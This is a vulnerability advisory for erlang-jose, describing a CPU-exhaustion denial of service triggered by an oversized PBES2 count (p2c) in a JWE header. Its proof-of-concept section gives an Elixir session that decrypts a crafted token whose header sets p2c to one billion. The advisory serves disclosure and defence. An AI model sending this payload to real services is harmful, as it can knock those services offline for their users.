# erlang-jose

## Summary

erlang-jose (aka JOSE for Erlang and Elixir) through 1.11.6 allow attackers to cause a denial of service (CPU consumption) via a large p2c (aka PBES2 Count) value in a JOSE header.

## Description

potatosalad/erlang-jose is a Erlang module implementing JOSE(Json Object Signing and Encrypting) technologies.

The JWE key management algorithms based on PBKDF2 require a JOSE Header Parameter called p2c (PBES2 Count). This parameter dictates the number of PBKDF2 iterations needed to derive a CEK wrapping key. Its primary purpose is to intentionally slow down the key derivation function, making password brute-force and dictionary attacks more resource- intensive.

Therefore, if an attacker sets the p2c parameter in JWE to a very large number, it can cause a lot of computational consumption, resulting in a DOS attack.

## Poc

```elixir
iex(1)> jwk_secret = JOSE.JWK.from_oct("secret")
#JOSE.JWK<keys: :undefined, fields: %{}, ...>
iex(2)> JOSE.JWE.block_decrypt(jwk_secret, "eyJhbGciOiJQQkVTMi1IUzI1NitBMTI4S1ciLCJlbmMiOiJBMTI4R0NNIiwicDJjIjoxMDAwMDAwMDAwLCJwMnMiOiJmbmcxUVJNU1ljWDljb2s4RUhHWWhnIn0.YZBzMWbcndBWvOjf4c3R2oPtRsRqSKDc.rv6Qc-lKE0WA6-MI.bHE.hNkOsML8iJJWbd1KwDEGHQ") |> elem(0)
```

